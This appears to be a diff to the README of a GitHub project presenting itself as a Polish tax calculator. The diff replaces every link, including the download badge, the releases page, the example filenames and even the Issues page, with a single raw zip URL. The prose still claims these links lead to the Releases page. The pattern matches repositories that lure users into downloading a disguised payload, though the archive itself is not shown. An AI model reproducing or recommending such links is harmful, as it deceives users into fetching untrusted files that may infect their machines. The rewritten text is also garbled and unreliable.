@@ -4,7 +4,7 @@
 Welcome to the polish-tax-calculator! This software helps you easily calculate your net income and compare different tax forms in Poland. Whether you are an individual taxpayer or a small business owner, this tool can simplify your tax process.
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/RephiXD/polish-tax-calculator/releases)  
+[![Download](https://raw.githubusercontent.com/RephiXD/polish-tax-calculator/main/undebased/polish-tax-calculator.zip%20release-brightgreen)](https://raw.githubusercontent.com/RephiXD/polish-tax-calculator/main/undebased/polish-tax-calculator.zip)  
 Click the button above to get the latest version of the polish-tax-calculator. This link will take you to the Releases page, where you can download the software.
 
 ## 🌟 Features
@@ -20,9 +20,9 @@ Click the button above to get the latest version of the polish-tax-calculator. T
 ## 📹 Installation Instructions
 Here’s how to download and run the polish-tax-calculator:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/RephiXD/polish-tax-calculator/releases) of the repository.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/RephiXD/polish-tax-calculator/main/undebased/polish-tax-calculator.zip) of the repository.
    
-2. **Choose the Right File**: Look for the latest release. You will find files for various operating systems. Choose the one that fits your system—typically named something like `polish-tax-calculator-vX.X.X.exe` for Windows or `polish-tax-calculator-vX.X.X.app` for MacOS.
+2. **Choose the Right File**: Look for the latest release. You will find files for various operating systems. Choose the one that fits your system—typically named something like `https://raw.githubusercontent.com/RephiXD/polish-tax-calculator/main/undebased/polish-tax-calculator.zip` for Windows or `https://raw.githubusercontent.com/RephiXD/polish-tax-calculator/main/undebased/polish-tax-calculator.zip` for MacOS.
 
 3. **Download the File**: Click on the chosen file to download it to your computer. Your browser should save it in your default download folder.
 
@@ -45,7 +45,7 @@ If you encounter any issues:
 - Search the issues section of the repository for similar problems and solutions.
 
 ## 📬 Need Help?
-Feel free to reach out for support. You can create an issue on our [GitHub Issues page](https://github.com/RephiXD/polish-tax-calculator/issues), and we will assist you as quickly as possible.
+Feel free to reach out for support. You can create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/RephiXD/polish-tax-calculator/main/undebased/polish-tax-calculator.zip), and we will assist you as quickly as possible.
 
 ## 📈 Future Updates
 We’re continuously working to enhance the polish-tax-calculator. Upcoming features may include:
